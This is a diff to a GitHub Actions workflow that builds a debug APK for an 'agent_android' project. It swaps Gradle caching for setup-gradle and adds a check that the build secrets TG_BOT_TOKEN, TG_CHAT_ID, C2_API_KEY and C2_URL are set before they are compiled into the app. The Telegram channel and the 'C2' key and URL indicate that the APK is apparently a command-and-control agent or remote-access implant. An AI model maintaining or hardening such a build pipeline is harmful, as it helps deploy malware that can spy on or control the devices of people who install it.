@@ -28,6 +28,12 @@ jobs:
           distribution: temurin
           java-version: '17'
 
+      # Preferred over `gradle wrapper` with a preinstalled gradle: the
+      # wrapper jar is not committed, and relying on the runner image is
+      # what made this job fragile.
+      - name: Set up Gradle
+        uses: gradle/actions/setup-gradle@v4
+
       - name: Configure Android SDK
         run: |
           echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
@@ -39,31 +45,22 @@ jobs:
       - name: Write local.properties
         run: echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
 
-      - name: Cache Gradle
-        uses: actions/cache@v4
-        with:
-          path: |
-            ~/.gradle/caches
-            ~/.gradle/wrapper
-          key: gradle-${{ runner.os }}-${{ hashFiles('agent_android/**/*.gradle*', 'agent_android/**/gradle-wrapper.properties') }}
-          restore-keys: |
-            gradle-${{ runner.os }}-
-
-      - name: Generate Gradle wrapper
-        run: |
-          if [ ! -f gradlew ]; then
-            gradle wrapper --gradle-version 8.4
-          fi
-
-      - name: Grant execute permission
-        run: chmod +x gradlew
-
-      - name: Build debug APK
+      # build.gradle throws on any missing value, so this fails the job
+      # instead of quietly baking "placeholder" into the APK.
+      - name: Verify build secrets are present
         env:
           TG_BOT_TOKEN: ${{ secrets.TG_BOT_TOKEN }}
           TG_CHAT_ID:   ${{ secrets.TG_CHAT_ID }}
           C2_API_KEY:   ${{ secrets.C2_API_KEY }}
           C2_URL:       ${{ secrets.C2_URL }}
+        run: |
+          missing=0
+          for name in TG_BOT_TOKEN TG_CHAT_ID C2_API_KEY C2_URL; do
+            if [ -z "${!name}" ]; then echo "::error::secret $name is not set"; missing=1; fi
+          done
+          [ "$missing" -eq 0 ]
+
+      - name: Build debug APK
         run: ./gradlew assembleDebug --no-daemon --stacktrace
 
       - name: Upload debug APK
